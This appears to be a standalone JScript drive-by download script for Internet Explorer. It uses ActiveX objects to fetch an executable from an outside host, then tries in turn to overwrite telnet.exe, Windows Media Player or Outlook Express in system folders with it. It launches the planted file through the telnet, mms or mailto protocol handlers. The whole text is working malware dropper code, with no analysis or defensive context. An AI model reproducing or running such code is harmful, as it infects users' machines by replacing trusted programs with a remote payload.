var x = new ActiveXObject("Microsoft.XMLHTTP"); 
lol = "http://greg-search.com/G7/file1.exe";
x.Open("GET", lol, 0); 
x.Send(); 

var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
var oldu = 0;

try
{
  s.SaveToFile("C:\\WINDOWS\\system32\\telnet.exe",2);
  oldu = 1;
  location.href = "telnet://";
}
catch (e1)
{
  
}

if (oldu == 0)
{
  try
  {
    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    oldu = 1;
    location.href = "mms://";
  }
  catch (e2)
  {
    
  }
}

if (oldu == 0)
{
  try
  {
    s.SaveToFile("C:\\Program Files\\Outlook Express\\msimn.exe",2);
    oldu = 1;
    location.href = "mailto:";
  }
  catch (e3)
  {

  }
}

if (oldu == 0)
{
  try
  {
    s.SaveToFile("C:\\WINXP\\system32\\telnet.exe",2);
    oldu = 1;
    location.href = "telnet://";
  }
  catch (e4)
  {

  }
}
